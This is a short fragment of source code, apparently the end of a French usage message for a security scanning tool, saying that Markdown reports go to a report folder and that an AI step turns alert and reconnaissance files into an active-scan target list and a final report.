        "  - Les rapports Markdown sont générés dans <outdir>/report/.\n"
        "  - L'IA MCP est invoquée à partir des alerts_*.json + recon_* pour produire\n"
        "    la targetlist d'active scan et le rapport final (CLI + Markdown).\n"
        "\n";
        return 1;
    }
}